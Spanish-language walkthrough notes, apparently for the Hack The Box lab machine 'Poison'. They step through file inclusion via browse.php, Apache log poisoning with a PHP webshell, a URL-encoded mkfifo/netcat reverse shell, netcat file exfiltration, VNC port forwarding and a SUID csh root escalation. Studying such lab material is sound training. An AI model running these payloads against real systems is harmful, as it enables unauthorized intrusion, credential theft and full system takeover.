PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Entramos al puerto 80 y vemos un input para incluir archivos, la URL queda de la siguiente forma:
	-http://10.10.10.84/browse.php?file=info.php

-Todo apunta a una vulnerabilidad **'Directory Traversal'**, aplicamos **Wrappers** para ver el código fuente del archivo **'browse.php'**:
	-http://10.10.10.84/browse.php?file=php://filter/convert.base64-encode/resource=browse.php
		PD9waHAKaW5jbHVkZSgkX0dFVFsnZmlsZSddKTsKPz4K
	-Lo decodificamos:
		-echo 'PD9waHAKaW5jbHVkZSgkX0dFVFsnZmlsZSddKTsKPz4K' | base64 -d
			<?php
				include($_GET['file']);
			?>

-Hemos confirmado que se está incluyendo sin ningún tipo de validación cualquier archivo que introduzcamos, probamos a incluir el /etc/passwd:
	-http://10.10.10.84/browse.php?file=/etc/passwd
		-Vemos el /etc/passwd!!

-Intentamos enumerar la clave privada del usuario 'charix' **sin éxito**:
	-http://10.10.10.84/browse.php?file=/home/charix/.ssh/id_rsa
	 **NO FUNCIONA!**

## Log Poisoning 

## Logs Apache

### Identificamos la ruta de logs

-Probamos a incluir el archivo de logs , cómo estamos ante un servidor Apache probamos estos:
	-Rutas típicas dependiendo del sistema Operativo:
		**-Linux (Debian/Ubuntu)**
			-/var/log/apache2/access.log
			-/var/log/apache2/error.log
		**-Linux (CentOS/RHEL/Fedora)**
			-/var/log/httpd/access_log
			-/var/log/httpd/error_log
		-**Linux BSD, Alpine, OpenRC**
			-/var/log/httpd-access.log
			-/var/log/httpd-error.log

-Cómo el Wappalizer indica que estamos ante un sistema **Linux Free BSD**, probamos la siguiente:
	-/var/log/httpd-access.log
		-Vemos los logs , FUNCIONA!!

### Envenenamos los logs (2 Formas)

1-Con Burpsuite
	-Interceptamos la petición en:
		-http://10.10.10.84/browse.php?file=/var/log/httpd-access.log
	-Ejecutar comando directamente:
		-User-Agent: <?php system('id'); ?> (hay que recargar la página)
	-Inyectamos una webshell en el user-agent:
		-User-Agent: ![[Pasted image 20250422123726.png]]
	-Ejecutamos comandos a través de la webshell:
		-GET /browse.php?file=/var/log/httpd-access.log&cmd=id
			uid=80(www) gid=80(www) groups=80(www)
	-Nos mandamos una reverse shell (mkfifo), tenemos que URL ENCODEARLA:
		-GET /browse.php?file=/var/log/httpd-access.log&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.7%201234%20%3E%2Ftmp%2Ff 
			-$ whoami **(Estamos dentro!!)**
				www 

2-Con Curl
	-Ejecutar un comando directamente:
		curl -s -X GET 'http://10.10.10.84/browse.php?file=/var/log/httpd-access.log' -H "User-Agent: <?php system('ls'); ?>"
			uid=80(www) gid=80(www) groups=80(www) (Se ejecuta al recargar la página)
	-Inyectar WebShell:
		-curl -s -X GET 'http://10.10.10.84/browse.php?file=/var/log/httpd-access.log' -H "User-Agent: <?php system(\$_GET['c']); ?>"
	-Ejecutar comando desde la WebShell:
		-curl -s -X GET 'http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=id' 
	-Nos mandamos una rs (mkfifo) URL encodeada:
		-curl -s -X GET 'http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.7%201234%20%3E%2Ftmp%2Ff'
			$ whoami
			www

-Una vez dentro , podemos entrar por SSH de la siguiente manera:
	-Vemos el contenido del archivo 'pwdbackup.txt':
		-Es una cadena encriptada en base64 13 veces, para desencriptarla creamos el siguiente script:
			import base64
			data = '''Aquí introducimos la cadena (Es muy larga)'''
			for i in range(20):  # intenta más de 13 veces por si acaso
			    try:
			        data = base64.b64decode(data).decode('utf-8')
			        print(f"[{i+1}] {data[:60]}")
			    except Exception as e:
			        print(f" Error en la iteración {i+1}: {e}")
			        break

-La contraseña es: 
	Charix!2#4%6&8(0

-Nos conectamos por SSH con la contraseña obtenida:
	-ssh charix@10.10.10.84
	-Password: Charix!2#4%6&8(0
		charix@Poison:~ % whoami
			charix (Ya somos el usuario Charix!!)

## Escalada de Privilegios

-En la ruta /home/charix encontramos el siguiente archivo:
	-secret.zip

-Transferimos el archivo a nuestra máquina local, como la máquina no tiene python instalado, lo hacemos con Netcat:
	-En nuestra máquina:
		-nc -lvnp 1234 > secret.zip
	-En la máquina víctima:
		-cat secret.zip | nc 10.10.7.14 1234

-NOTA: Después me di cuenta de que la máquina tiene instalado python2.7 (which python2.7) , se puede iniciar un servidor de la siguiente manera:
	-python2.7 -m SimpleHTTPServer

-Intentamos Descomprimir el archivo pero nos pide contraseña, generamos hash con john y lo intentamos romper pero la contraseña no se encuentra en el Rockyou.txt

-Probamos con la contraseña del usuario Charix:
	-unzip secret.zip 
	-Password: Charix!2#4%6&8(0
		-Funciona!! , Nos lo ha descomprimido
			secret --> Dentro hay caracteres raros

-Probamos a ver los puertos que tiene la máquina abiertos internamente:
	-netstat -a:
		-A parte del 22 y el 80 vemos los siguientes:
			-localhost.5801
			-localhost.5901

-Aplicamos Local Port Forwarding para traernos el puerto 5901 de la máquina víctima a nuestra máquina local:
	-ssh charix@10.10.10.84 -L 5901:127.0.0.1:5901
	-Password: Charix!2#4%6&8(0

-Escaneamos el puerto localmente para ver la versión y el servicio:
	-nmap -p5901 -sCV -Pn 127.0.0.1
		PORT     STATE SERVICE VERSION
		5901/tcp open  vnc     VNC (protocol 3.8)

-nos autenticamos en el servicio VNC aportando el binario 'secret' que encontramos anteriormente:
	-vncviewer -passwd secret 127.0.0.1:5901
		-root@Poison:# whoami
			root
			-Nos aparece una consola super antigua , y ya somos el **usuario root!!**

-Para obtener una shell como root en la consola normal de la máquina:
	-Damos permisos SUID a la csh (no usa una bash, usa una csh , lo vemos en el /etc/passwd):
		-chmod u+s /bin/csh
		-Nos salimos de la consola antigua esta
	-Desde la máquina víctima , comprobamos que tenemos los permisos SUID:
		-charix@Poison:~ % ls -l /bin/csh
			-r-sr-xr-x  2 root  wheel  423784 Jul 21  2017 /bin/csh
	-Upgradeamos la shell para convertirnos en root:
		-charix@Poison:~ % csh -b
			root@Poison:~ # whoami
			root








